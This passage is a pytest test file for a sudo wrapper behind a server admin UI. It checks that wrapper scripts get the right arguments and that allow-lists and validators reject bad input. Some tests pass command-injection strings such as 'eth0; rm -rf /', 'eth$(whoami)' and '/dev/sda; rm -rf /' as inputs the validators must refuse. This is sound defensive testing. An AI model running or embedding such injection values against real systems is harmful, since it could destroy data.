        """stop_service が adminui-service-stop.sh を呼び出す"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-service-stop.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "stopped"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.stop_service("nginx")

        args_called = mock_run.call_args[0][0]
        assert "nginx" in args_called
        assert any("adminui-service-stop.sh" in str(a) for a in args_called)


class TestGetLogs:
    """get_logs メソッドのテスト"""

    def test_get_logs_default_lines(self, tmp_path):
        """get_logs がデフォルト100行でadminui-logs.shを呼び出す"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-logs.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"lines": []})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.get_logs("nginx")

        args_called = mock_run.call_args[0][0]
        assert "nginx" in args_called
        assert "100" in args_called

    def test_get_logs_custom_lines(self, tmp_path):
        """get_logs がカスタム行数でadminui-logs.shを呼び出す"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-logs.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"lines": []})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.get_logs("sshd", lines=50)

        args_called = mock_run.call_args[0][0]
        assert "sshd" in args_called
        assert "50" in args_called


class TestNetworkMethods:
    """ネットワーク情報取得メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-network.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"data": []})
        return m

    def test_get_network_interfaces(self, tmp_path):
        """get_network_interfaces が interfaces コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_network_interfaces()
        args_called = mock_run.call_args[0][0]
        assert "interfaces" in args_called

    def test_get_network_stats(self, tmp_path):
        """get_network_stats が stats コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_network_stats()
        args_called = mock_run.call_args[0][0]
        assert "stats" in args_called

    def test_get_network_connections(self, tmp_path):
        """get_network_connections が connections コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_network_connections()
        args_called = mock_run.call_args[0][0]
        assert "connections" in args_called

    def test_get_network_routes(self, tmp_path):
        """get_network_routes が routes コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_network_routes()
        args_called = mock_run.call_args[0][0]
        assert "routes" in args_called


class TestServerMethods:
    """サーバー管理メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-servers.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"status": "active"})
        return m

    def test_get_all_server_status(self, tmp_path):
        """get_all_server_status が status コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_all_server_status()
        args_called = mock_run.call_args[0][0]
        assert "status" in args_called

    def test_get_server_status_allowed(self, tmp_path):
        """get_server_status が許可済みサーバーに対して正常動作する"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_server_status("nginx")
        args_called = mock_run.call_args[0][0]
        assert "nginx" in args_called
        assert "status" in args_called

    def test_get_server_status_not_allowed(self, tmp_path):
        """get_server_status が許可リスト外のサーバーでValueErrorを送出する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="Server not allowed"):
            wrapper.get_server_status("unknown-server")

    def test_get_server_version_allowed(self, tmp_path):
        """get_server_version が許可済みサーバーで version コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_server_version("postgresql")
        args_called = mock_run.call_args[0][0]
        assert "version" in args_called
        assert "postgresql" in args_called

    def test_get_server_version_not_allowed(self, tmp_path):
        """get_server_version が許可リスト外のサーバーでValueErrorを送出する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="Server not allowed"):
            wrapper.get_server_version("malicious-db")

    def test_get_server_config_info_allowed(self, tmp_path):
        """get_server_config_info が許可済みサーバーで config コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_server_config_info("mysql")
        args_called = mock_run.call_args[0][0]
        assert "config" in args_called
        assert "mysql" in args_called

    def test_get_server_config_info_not_allowed(self, tmp_path):
        """get_server_config_info が許可リスト外のサーバーでValueErrorを送出する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="Server not allowed"):
            wrapper.get_server_config_info("hacked")

    def test_allowed_servers_list(self, tmp_path):
        """全ての許可済みサーバーが正常に動作する"""
        wrapper = self._make_wrapper(tmp_path)
        m = self._mock_result()
        for server in ("nginx", "apache2", "mysql", "postgresql", "redis"):
            with patch("subprocess.run", return_value=m):
                # ValueError が発生しなければ OK
                wrapper.get_server_status(server)


class TestBandwidthMethods:
    """帯域幅モニタリングメソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-bandwidth.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"data": {}})
        return m

    def test_get_bandwidth_interfaces(self, tmp_path):
        """get_bandwidth_interfaces が list コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_interfaces()
        args_called = mock_run.call_args[0][0]
        assert "list" in args_called

    def test_get_bandwidth_summary_no_iface(self, tmp_path):
        """get_bandwidth_summary がインターフェース指定なしで summary コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_summary()
        args_called = mock_run.call_args[0][0]
        assert "summary" in args_called

    def test_get_bandwidth_summary_with_iface(self, tmp_path):
        """get_bandwidth_summary がインターフェース指定ありで正常動作する"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_summary("eth0")
        args_called = mock_run.call_args[0][0]
        assert "summary" in args_called
        assert "eth0" in args_called

    def test_get_bandwidth_summary_invalid_iface(self, tmp_path):
        """get_bandwidth_summary が不正なインターフェース名でValueErrorを送出する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="Invalid interface name"):
            wrapper.get_bandwidth_summary("eth0; rm -rf /")

    def test_validate_iface_valid_patterns(self, tmp_path):
        """_validate_iface が有効なインターフェース名パターンを通過させる"""
        wrapper = self._make_wrapper(tmp_path)
        # These should not raise
        wrapper._validate_iface("eth0")
        wrapper._validate_iface("wlan0")
        wrapper._validate_iface("lo")
        wrapper._validate_iface("ens3")
        wrapper._validate_iface("enp0s3")
        wrapper._validate_iface("bond0.100")

    def test_validate_iface_invalid_patterns(self, tmp_path):
        """_validate_iface が不正なインターフェース名を拒否する"""
        wrapper = self._make_wrapper(tmp_path)
        for bad in ["eth0; rm -rf /", "eth$(whoami)", "", "a" * 33]:
            with pytest.raises(ValueError, match="Invalid interface name"):
                wrapper._validate_iface(bad)

    def test_get_bandwidth_daily_no_iface(self, tmp_path):
        """get_bandwidth_daily がインターフェース指定なしで daily コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_daily()
        args_called = mock_run.call_args[0][0]
        assert "daily" in args_called

    def test_get_bandwidth_daily_with_iface(self, tmp_path):
        """get_bandwidth_daily がインターフェース指定ありで正常動作する"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_daily("ens3")
        args_called = mock_run.call_args[0][0]
        assert "daily" in args_called
        assert "ens3" in args_called

    def test_get_bandwidth_hourly(self, tmp_path):
        """get_bandwidth_hourly が hourly コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_hourly()
        args_called = mock_run.call_args[0][0]
        assert "hourly" in args_called

    def test_get_bandwidth_live(self, tmp_path):
        """get_bandwidth_live が live コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_live()
        args_called = mock_run.call_args[0][0]
        assert "live" in args_called

    def test_get_bandwidth_top(self, tmp_path):
        """get_bandwidth_top が top コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_top()
        args_called = mock_run.call_args[0][0]
        assert "top" in args_called

    def test_get_bandwidth_hourly_with_iface(self, tmp_path):
        """get_bandwidth_hourly が iface 引数ありで _validate_iface を呼ぶ"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_hourly(iface="eth0")
        args_called = mock_run.call_args[0][0]
        assert "hourly" in args_called
        assert "eth0" in args_called

    def test_get_bandwidth_live_with_iface(self, tmp_path):
        """get_bandwidth_live が iface 引数ありで _validate_iface を呼ぶ"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_live(iface="eth0")
        args_called = mock_run.call_args[0][0]
        assert "live" in args_called
        assert "eth0" in args_called


class TestApacheMethods:
    """Apache モニタリングメソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-apache.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"status": "active"})
        return m

    def test_get_apache_status(self, tmp_path):
        """get_apache_status が status コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_apache_status()
        args_called = mock_run.call_args[0][0]
        assert "status" in args_called

    def test_get_apache_vhosts(self, tmp_path):
        """get_apache_vhosts が vhosts コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_apache_vhosts()
        args_called = mock_run.call_args[0][0]
        assert "vhosts" in args_called

    def test_get_apache_modules(self, tmp_path):
        """get_apache_modules が modules コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_apache_modules()
        args_called = mock_run.call_args[0][0]
        assert "modules" in args_called

    def test_get_apache_config_check(self, tmp_path):
        """get_apache_config_check が config-check コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_apache_config_check()
        args_called = mock_run.call_args[0][0]
        assert "config-check" in args_called


class TestHardwareMethods:
    """ハードウェア情報取得メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-hardware.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"data": {}})
        return m

    def test_get_hardware_disks(self, tmp_path):
        """get_hardware_disks が disks コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_hardware_disks()
        args_called = mock_run.call_args[0][0]
        assert "disks" in args_called

    def test_get_hardware_disk_usage(self, tmp_path):
        """get_hardware_disk_usage が disk_usage コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_hardware_disk_usage()
        args_called = mock_run.call_args[0][0]
        assert "disk_usage" in args_called

    def test_get_hardware_smart_valid_sda(self, tmp_path):
        """/dev/sda のような有効なデバイスパスを受け入れる"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_hardware_smart("/dev/sda")
        args_called = mock_run.call_args[0][0]
        assert "/dev/sda" in args_called
        assert "smart" in args_called

    def test_get_hardware_smart_valid_nvme(self, tmp_path):
        """/dev/nvme0n1 のような有効なNVMeデバイスパスを受け入れる"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_hardware_smart("/dev/nvme0n1")
        args_called = mock_run.call_args[0][0]
        assert "/dev/nvme0n1" in args_called

    def test_get_hardware_smart_invalid_path(self, tmp_path):
        """不正なデバイスパスでValueErrorを送出する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="Invalid device path"):
            wrapper.get_hardware_smart("/dev/random")

    def test_get_hardware_smart_injection_attempt(self, tmp_path):
        """インジェクション試行のデバイスパスでValueErrorを送出する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="Invalid device path"):
            wrapper.get_hardware_smart("/dev/sda; rm -rf /")

    def test_get_hardware_sensors(self, tmp_path):
        """get_hardware_sensors が sensors コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_hardware_sensors()
        args_called = mock_run.call_args[0][0]
        assert "sensors" in args_called

    def test_get_hardware_memory(self, tmp_path):
        """get_hardware_memory が memory コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_hardware_memory()
        args_called = mock_run.call_args[0][0]
        assert "memory" in args_called


class TestFirewallMethods:
    """ファイアウォール情報取得メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-firewall.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"rules": []})
        return m

    def test_get_firewall_rules(self, tmp_path):
        """get_firewall_rules が rules コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_firewall_rules()
        args_called = mock_run.call_args[0][0]
        assert "rules" in args_called

    def test_get_firewall_policy(self, tmp_path):
        """get_firewall_policy が policy コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_firewall_policy()
        args_called = mock_run.call_args[0][0]
        assert "policy" in args_called

    def test_get_firewall_status(self, tmp_path):
        """get_firewall_status が status コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_firewall_status()
        args_called = mock_run.call_args[0][0]
        assert "status" in args_called


class TestPackageMethods:
    """パッケージ管理メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-packages.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"packages": []})
        return m

    def test_get_packages_list(self, tmp_path):
        """get_packages_list が list コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_packages_list()
        args_called = mock_run.call_args[0][0]
        assert "list" in args_called

    def test_get_packages_updates(self, tmp_path):
        """get_packages_updates が updates コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_packages_updates()
        args_called = mock_run.call_args[0][0]
        assert "updates" in args_called

    def test_get_packages_security(self, tmp_path):
        """get_packages_security が security コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_packages_security()
        args_called = mock_run.call_args[0][0]
        assert "security" in args_called

    def test_get_packages_upgrade_dryrun(self, tmp_path):
        """get_packages_upgrade_dryrun が upgrade-dryrun コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_packages_upgrade_dryrun()
        args_called = mock_run.call_args[0][0]
        assert "upgrade-dryrun" in args_called

    def test_upgrade_package(self, tmp_path):
        """upgrade_package が upgrade コマンドとパッケージ名を渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.upgrade_package("vim")
        args_called = mock_run.call_args[0][0]
        assert "upgrade" in args_called
        assert "vim" in args_called

    def test_upgrade_all_packages(self, tmp_path):
        """upgrade_all_packages が upgrade-all コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.upgrade_all_packages()
        args_called = mock_run.call_args[0][0]
        assert "upgrade-all" in args_called


class TestSSHMethods:
    """SSH 設定取得メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-ssh.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"status": "active"})
        return m

    def test_get_ssh_status(self, tmp_path):
        """get_ssh_status が status コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_ssh_status()
        args_called = mock_run.call_args[0][0]
        assert "status" in args_called

    def test_get_ssh_config(self, tmp_path):
        """get_ssh_config が config コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_ssh_config()
        args_called = mock_run.call_args[0][0]
        assert "config" in args_called


class TestUserModifyMethods:
    """ユーザー属性変更メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-user-modify.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"status": "ok"})
        return m

    def test_modify_user_shell(self, tmp_path):
        """modify_user_shell が set-shell コマンドとユーザー名・シェルを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.modify_user_shell("alice", "/bin/zsh")
        args_called = mock_run.call_args[0][0]
        assert "set-shell" in args_called
        assert "alice" in args_called
        assert "/bin/zsh" in args_called

    def test_modify_user_gecos(self, tmp_path):
        """modify_user_gecos が set-gecos コマンドとユーザー名・GECOSを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.modify_user_gecos("bob", "Bob Smith")
        args_called = mock_run.call_args[0][0]
        assert "set-gecos" in args_called
        assert "bob" in args_called
        assert "Bob Smith" in args_called

    def test_modify_user_add_group(self, tmp_path):
        """modify_user_add_group が add-group コマンドとユーザー名・グループ名を渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.modify_user_add_group("alice", "docker")
        args_called = mock_run.call_args[0][0]
        assert "add-group" in args_called
        assert "alice" in args_called
        assert "docker" in args_called

    def test_modify_user_remove_group(self, tmp_path):
        """modify_user_remove_group が remove-group コマンドとユーザー名・グループ名を渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.modify_user_remove_group("alice", "sudo")
        args_called = mock_run.call_args[0][0]
        assert "remove-group" in args_called
        assert "alice" in args_called
        assert "sudo" in args_called


class TestFirewallWriteMethods:
    """ファイアウォール書き込みメソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-firewall-write.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"status": "ok"})
        return m

    def test_allow_firewall_port_default_tcp(self, tmp_path):
        """allow_firewall_port がデフォルトtcpで allow-port コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.allow_firewall_port(8080)
        args_called = mock_run.call_args[0][0]
        assert "allow-port" in args_called
        assert "8080" in args_called
        assert "tcp" in args_called

    def test_allow_firewall_port_udp(self, tmp_path):
        """allow_firewall_port が udp プロトコルで allow-port コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.allow_firewall_port(53, "udp")
        args_called = mock_run.call_args[0][0]
        assert "allow-port" in args_called
        assert "53" in args_called
        assert "udp" in args_called

    def test_deny_firewall_port(self, tmp_path):
        """deny_firewall_port が deny-port コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.deny_firewall_port(23)
        args_called = mock_run.call_args[0][0]
        assert "deny-port" in args_called
        assert "23" in args_called

    def test_delete_firewall_rule(self, tmp_path):
        """delete_firewall_rule が delete-rule コマンドとルール番号を渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.delete_firewall_rule(5)
        args_called = mock_run.call_args[0][0]
        assert "delete-rule" in args_called
        assert "5" in args_called


class TestFilesystemMethods:
    """ファイルシステム情報取得メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-filesystem.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"data": []})
        return m

    def test_get_filesystem_usage(self, tmp_path):
        """get_filesystem_usage が df コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_filesystem_usage()
        args_called = mock_run.call_args[0][0]
        assert "df" in args_called

    def test_get_filesystem_du_default_path(self, tmp_path):
        """get_filesystem_du がデフォルト / パスで du コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_filesystem_du()
        args_called = mock_run.call_args[0][0]
        assert "du" in args_called
        assert "/" in args_called

    def test_get_filesystem_du_custom_path(self, tmp_path):
        """get_filesystem_du がカスタムパスで du コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_filesystem_du("/var/log")
        args_called = mock_run.call_args[0][0]
        assert "du" in args_called
        assert "/var/log" in args_called

    def test_get_filesystem_mounts(self, tmp_path):
        """get_filesystem_mounts が mounts コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_filesystem_mounts()
        args_called = mock_run.call_args[0][0]
        assert "mounts" in args_called


class TestBootupMethods:
    """起動・シャットダウン管理メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-bootup.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"status": "ok"})
        return m

    def test_get_bootup_status(self, tmp_path):
        """get_bootup_status が status コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bootup_status()
        args_called = mock_run.call_args[0][0]
        assert "status" in args_called

    def test_get_bootup_services(self, tmp_path):
        """get_bootup_services が services コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bootup_services()
        args_called = mock_run.call_args[0][0]
        assert "services" in args_called

    def test_enable_service_at_boot(self, tmp_path):
        """enable_service_at_boot が enable コマンドとサービス名を渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.enable_service_at_boot("nginx")
        args_called = mock_run.call_args[0][0]
        assert "enable" in args_called
        assert "nginx" in args_called

    def test_disable_service_at_boot(self, tmp_path):
        """disable_service_at_boot が disable コマンドとサービス名を渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.disable_service_at_boot("bluetooth")
        args_called = mock_run.call_args[0][0]
        assert "disable" in args_called
        assert "bluetooth" in args_called

    def test_schedule_shutdown_default_delay(self, tmp_path):
        """schedule_shutdown がデフォルト遅延で shutdown コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.schedule_shutdown()
        args_called = mock_run.call_args[0][0]
        assert "shutdown" in args_called
        assert "+1" in args_called

    def test_schedule_shutdown_custom_delay(self, tmp_path):
        """schedule_shutdown がカスタム遅延で shutdown コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.schedule_shutdown("+10")
        args_called = mock_run.call_args[0][0]
        assert "shutdown" in args_called
        assert "+10" in args_called

    def test_schedule_reboot_default_delay(self, tmp_path):
        """schedule_reboot がデフォルト遅延で reboot コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.schedule_reboot()
        args_called = mock_run.call_args[0][0]
        assert "reboot" in args_called
        assert "+1" in args_called

    def test_schedule_reboot_custom_delay(self, tmp_path):
        """schedule_reboot がカスタム遅延で reboot コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.schedule_reboot("now")
        args_called = mock_run.call_args[0][0]
        assert "reboot" in args_called
        assert "now" in args_called


class TestTimeMethods:
    """システム時刻管理メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-time.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"timezone": "Asia/Tokyo"})
        return m

    def test_get_time_status(self, tmp_path):
        """get_time_status が status コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_time_status()
        args_called = mock_run.call_args[0][0]
        assert "status" in args_called

    def test_get_timezones(self, tmp_path):
        """get_timezones が list-timezones コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_timezones()
        args_called = mock_run.call_args[0][0]
        assert "list-timezones" in args_called

    def test_set_timezone(self, tmp_path):
        """set_timezone が set-timezone コマンドとタイムゾーンを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.set_timezone("Asia/Tokyo")
        args_called = mock_run.call_args[0][0]
        assert "set-timezone" in args_called
        assert "Asia/Tokyo" in args_called


class TestQuotaMethods:
    """ディスククォータ管理メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-quotas.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"quotas": []})
        return m

    def test_get_quota_status_no_filesystem(self, tmp_path):
        """get_quota_status がファイルシステム指定なしで status コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_quota_status()
        args_called = mock_run.call_args[0][0]
        assert "status" in args_called

    def test_get_quota_status_with_filesystem(self, tmp_path):
        """get_quota_status がファイルシステム指定ありで正常動作する"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_quota_status("/dev/sda1")
        args_called = mock_run.call_args[0][0]
        assert "status" in args_called
        assert "/dev/sda1" in args_called

    def test_get_user_quota(self, tmp_path):
        """get_user_quota が user コマンドとユーザー名を渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_user_quota("alice")
        args_called = mock_run.call_args[0][0]
        assert "user" in args_called
        assert "alice" in args_called

    def test_get_group_quota(self, tmp_path):
